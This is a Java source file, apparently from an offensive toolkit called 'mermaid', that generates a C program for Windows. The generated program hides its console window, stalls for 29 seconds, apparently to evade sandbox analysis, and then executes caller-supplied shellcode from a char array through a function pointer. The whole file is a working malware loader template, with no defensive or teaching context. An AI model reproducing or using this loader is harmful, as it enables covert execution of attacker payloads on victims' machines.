package net.jlxip.mermaid.exploits;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;

public class MerCode {
	public static void generate(File file, String SHELLCODE) {
		try {
			FileWriter fw = new FileWriter(file);
			PrintWriter pw = new PrintWriter(fw);
			
			pw.println("#include <windows.h>");
			pw.println("#define _WIN32_WINNT 0x0500");
			pw.println("main(){");
			pw.println("  ShowWindow(GetConsoleWindow(), SW_HIDE);");
			
			pw.println("  int retTime = time(0) + 29;");
            pw.println("  while(time(0)<retTime);");
            
			pw.println("  char a[] = \""+SHELLCODE+"\";");			
			pw.println("  int (*run)() = (int(*)())a;");
			pw.println("  run();");
			pw.println("}");
			
			pw.close();
			fw.close();
		} catch(IOException ioe) {
			ioe.printStackTrace();
		}
	}
}
